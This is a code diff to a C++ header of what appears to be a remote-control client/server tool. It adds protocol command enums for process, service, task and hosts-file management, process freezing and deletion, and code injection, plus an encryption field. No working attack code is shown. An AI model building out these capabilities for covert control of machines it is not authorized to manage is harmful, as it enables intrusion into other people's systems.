@@ -163,6 +163,7 @@ enum
 	COMMAND_UPDATE = 53,			// 客户端升级
 	COMMAND_SHARE = 59,				// 分享主机
 	COMMAND_PROXY = 60,				// 代理映射
+	TOKEN_SYSINFOLIST = 61,			// 主机管理
 
 	// 服务端发出的标识
 	TOKEN_AUTH = 100,				// 要求验证
@@ -284,6 +285,72 @@ enum DecryptCommand {
 
 typedef DecryptCommand BroType;
 
+// 这是服务管理页面既有定义
+#define CMD_WINDOW_CLOSE	0		// 关闭窗口
+#define CMD_WINDOW_TEST		1		// 操作窗口
+
+// MachineManager 系统管理, 前几个枚举值顺序不得修改
+enum MachineManager {
+	COMMAND_MACHINE_PROCESS,
+	COMMAND_MACHINE_WINDOWS,
+	COMMAND_MACHINE_NETSTATE,
+	COMMAND_MACHINE_SOFTWARE,
+	COMMAND_MACHINE_HTML,
+	COMMAND_MACHINE_FAVORITES,
+	COMMAND_MACHINE_WIN32SERVICE,
+	COMMAND_MACHINE_DRIVERSERVICE,
+	COMMAND_MACHINE_TASK,
+	COMMAND_MACHINE_HOSTS, //不能乱序号
+
+	COMMAND_APPUNINSTALL,//卸载
+	COMMAND_WINDOW_OPERATE,//窗口控制
+	COMMAND_WINDOW_CLOSE,//关闭
+	COMMAND_PROCESS_KILL,//结束进程
+	COMMAND_PROCESS_KILLDEL,//结束进程----删除
+	COMMAND_PROCESS_DEL,//强制删除 不需要结束进程
+	COMMAND_PROCESS_FREEZING,//冻结
+	COMMAND_PROCESS_THAW,//解冻
+	COMMAND_HOSTS_SET,//hosts
+
+	COMMAND_SERVICE_LIST_WIN32,
+	COMMAND_SERVICE_LIST_DRIVER,
+	COMMAND_DELETESERVERICE,
+	COMMAND_STARTSERVERICE,
+	COMMAND_STOPSERVERICE,
+	COMMAND_PAUSESERVERICE,
+	COMMAND_CONTINUESERVERICE,
+
+	COMMAND_TASKCREAT,
+	COMMAND_TASKDEL,
+	COMMAND_TASKSTOP,
+	COMMAND_TASKSTART,
+
+	COMMAND_INJECT,
+
+	TOKEN_MACHINE_PROCESS,
+	TOKEN_MACHINE_WINDOWS,
+	TOKEN_MACHINE_NETSTATE,
+	TOKEN_MACHINE_SOFTWARE,
+	TOKEN_MACHINE_HTML,
+	TOKEN_MACHINE_FAVORITES,
+	TOKEN_MACHINE_WIN32SERVICE,
+	TOKEN_MACHINE_DRIVERSERVICE,
+	TOKEN_MACHINE_HOSTS,
+	TOKEN_MACHINE_SERVICE_LIST,
+	TOKEN_MACHINE_TASKLIST,
+
+	TOKEN_MACHINE_MSG,
+};
+
+struct  WINDOWSINFO {
+	char strTitle[1024];
+	DWORD m_poceessid;
+	DWORD m_hwnd;
+	bool canlook;
+	int w;
+	int h;
+};
+
 enum 
 {
 	CLIENT_TYPE_DLL = 0,			// 客户端代码以DLL运行
@@ -387,7 +454,8 @@ public:
 	char            szBuildDate[12];
 	int             iMultiOpen;
 	int				iStartup;		 // 启动方式
-	char            szReserved[130]; // 占位，使结构体占据300字节
+	int				iHeaderEnc;		 // 数据加密类型
+	char            szReserved[126]; // 占位，使结构体占据300字节
 
 public:
 	void SetType(int typ) {
@@ -471,7 +539,7 @@ struct PluginParam {
 	char IP[100];			// 主控IP
 	int Port;				// 主控端口
 	State *Exit;			// 客户端状态
-	void* User;				// 自定义参数
+	void* User;				// CONNECT_ADDRESS* 指针
 	PluginParam(const char*ip, int port, State *s, void* u=0) : Port(port), Exit(s), User(u){
 		strcpy_s(IP, ip);
 	}
